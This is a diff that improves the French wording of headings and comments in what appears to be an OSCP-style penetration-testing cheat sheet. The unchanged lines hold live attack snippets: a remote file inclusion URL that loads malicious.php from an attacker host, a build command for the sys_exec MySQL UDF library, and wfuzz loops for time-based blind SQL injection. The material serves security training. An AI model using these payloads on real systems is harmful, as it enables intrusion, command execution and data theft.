@@ -1060,18 +1060,18 @@ python rfiscanner.py <target_url>
 Examiner les entrées et les réponses de l'application web.
 
 
-#### De base RFI Example
+#### Exemple simple de RFI
 
 
 
 
 ```bash
-# Ceci suppose que les paramètres allow url fopen ou allow url include du serveur sont activés.
+# Cette technique nécessite que allow_url_fopen ou allow_url_include soit activé sur le serveur.
 http://<target_url>/file.php?recurse=http://<attacker_ip>/malicious.php
 ```
 
 
-#### Reverse Shell via RFI
+#### Shell inversé via RFI
 
 
 <p class="oscp-command-note">Exécuter un script Python.</p>
@@ -1765,12 +1765,12 @@ long long sys_exec(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)
 ```bash
 sudo apt install mysql-server-dev libmysqlclient-dev
 
-# Compilez le code source dans un fichier .so ; le résultat lib mysqludf sys. Donc le fichier peut maintenant être utilisé.
+# Compiler le code en bibliothèque partagée .so : le fichier obtenu se nomme lib_mysqludf_sys.so.
 gcc -Wall -fPIC -I/usr/include/mysql -shared -o lib_mysqludf_sys.so lib_mysqludf_sys.c -lc
 
-# -fPIC: Generates position-independent code (required for shared objects).
-# -shared: Tells the compiler to generate a shared library.
-# -I/usr/include/mysql: Includes MySQL development headers. 
+# -fPIC : produire du code indépendant de l'adresse, nécessaire aux bibliothèques partagées.
+# -shared : produire une bibliothèque partagée.
+# -I/usr/include/mysql : inclure les en-têtes de développement MySQL. 
 ```
 
 
@@ -2385,8 +2385,8 @@ for i in $(seq 1 10); do
   wfuzz -v -c -z range,32-127 "http://<host>/index.php?id=1' AND IF(ASCII(SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0,1), $i, 1))=FUZZ, SLEEP(10), NULL) --+"; 
 done > <filename.txt> && grep "0m9" <filename.txt
 
-# Remplacer table name et table schema par les noms réels s'ils ciblent des bases de données ou des tables spécifiques.
-# Adjust LIMIT 0,1 to enumerate multiple tables by changing the first argument of LIMIT.
+# Remplacer table_name et table_schema par les noms réels des tables et bases ciblées.
+# Modifier le premier argument de LIMIT 0,1 pour parcourir plusieurs tables.
 ```
 
 
@@ -2397,7 +2397,7 @@ done > <filename.txt> && grep "0m9" <filename.txt
 
 
 ```bash
-# Uses ASCII value extraction to determine each character of a column name
+# Déterminer les caractères d'un nom de colonne à partir de leurs valeurs ASCII.
 for i in $(seq 1 10); do 
   wfuzz -v -c -z range,32-127 "http://<host>/index.php?id=1' AND IF(ASCII(SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_name='<table_name>' LIMIT 0,1), $i, 1))=FUZZ, SLEEP(10), NULL) --+"; 
 done > <filename.txt> && grep "0m9" <filename.txt
